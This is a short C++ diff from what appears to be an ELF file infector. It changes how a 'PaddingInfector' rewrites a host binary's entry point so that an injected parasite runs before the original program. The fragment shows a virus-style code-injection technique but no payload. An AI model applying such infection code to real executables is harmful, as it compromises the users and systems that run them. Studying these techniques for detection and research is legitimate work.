@@ -41,13 +41,8 @@ void patch_phdr(Elf64_Phdr& phdr, uint64_t parasite_size_and_padding,
   phdr_entry->p_memsz += parasite_size_and_padding;
 }
 
-void patch_ehdr(Elf64_Ehdr& header, Elf64_Addr parasite_load_address,
-                Elf64_Off parasite_file_offset) {
-  if (header.e_type == ET_EXEC) {
-    header.e_entry = parasite_load_address;
-  } else {
-    header.e_entry = parasite_file_offset;
-  }
+void patch_ehdr(Elf64_Ehdr& header, Elf64_Addr parasite_load_address) {
+  header.e_entry = parasite_load_address;
 }
 
 }  // namespace
@@ -161,7 +156,7 @@ bool PaddingInfector::inject(std::span<std::byte> host_mapping,
   {
     auto& mutble_ehdr = reinterpret_cast<Elf64_Ehdr&>(host_mapping.front());
     // Patch elf header entry point to run the parasite first.
-    patch_ehdr(mutble_ehdr, parasite_load_address_, parasite_file_offset_);
+    patch_ehdr(mutble_ehdr, parasite_load_address_);
   }
 
   // Inject parasite.
